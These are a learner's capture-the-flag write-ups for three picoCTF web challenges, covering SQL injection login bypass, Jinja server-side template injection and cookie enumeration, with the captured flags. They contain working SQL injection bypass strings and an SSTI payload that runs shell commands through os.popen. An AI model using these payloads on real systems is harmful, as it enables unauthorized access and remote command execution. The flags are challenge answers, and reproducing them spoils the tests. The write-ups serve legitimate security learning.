# 1. Web Gaunlet

> Can you beat the filters?
Log in as admin http://shape-facility.picoctf.net:62422/ http://shape-facility.picoctf.net:62422/filter.php

## Solution:

- gave random username and password, saw SQL statement displayed on screen which confirmed this challenge has to do with SQL injection
- in the username field, tried givin `admin' and 1=1--` which got me to round 2. Realised that `admin'--` would work too.
- tried multi-line comments `admin'/*` for round 2 and round 3 which worked.
- got stuck here for quite some time, on readin and googling further, found the use of concatenate operator `||`
- used the query `a'||'dmin'/*` to concatenate the string and passed it in username field with random password. Passed round 4 and 5

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{y0u_m4d3_1t_79a0ddc6}
```

## Concepts learnt:

- in the WHERE clause, givin smthn like `admin' and 1=1--` would work if `admin` exists in the list of users, and -- comments out the password check clause. `admin'--` works too since im commenting out the password check.

- you can use multi-line commands too like `admin'/*` without closin it to do the same.

- you can use `||` operator to concatenate two strings in sql.


## Resources:

- [SQL Injection Beginner Crash Course](https://www.youtube.com/watch?v=HbYdWajOCx4)


***

# 2. SSTI1

> I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.

## Solution:

- read up a bit and watched yt vids of SSTI
- passed `{{7*7}}` which returned 49 so assuming its a python based engine(Jinja).
- ran `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` which gave an output `flag` along with others
- ran this and got flag `{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}`

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_9451989d}
```

## Concepts learnt:

- use a bunch of checks like {{7*7}} available online to identify engine

- In jinja, try to get the os module to run shell commands like `ls`



## Resources:

- [SSTI Complete Lab Breakdown: Basic server-side template injection](https://www.youtube.com/watch?v=QLqHMMcBXuQ)
- [Hacktricks](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html)
- [More read](https://onsecurity.io/article/server-side-template-injection-with-jinja2/)


***

# 3. Cookies

> Who doesn't love cookies? Try to figure out the best one. http://mercury.picoctf.net:21485/


## Solution:

- went to applications tab, tinkered arnd with the cookies page.
- discovered that changing the value of name cookie gives different outputs.
- found the range to be from 0-28
- after multiple trials, found the value 18 to give the cookie
- shouldve used python script to do this

```
put codes & terminal outputs here using triple backticks

you may also use ```python for python codes for example
```

## Flag:

```
picoCTF{3v3ry1_l0v3s_c00k135_94190c8a}

```

## Concepts learnt:

- get cookie information in `application` tab
- start implementing python scripts to make things easier



***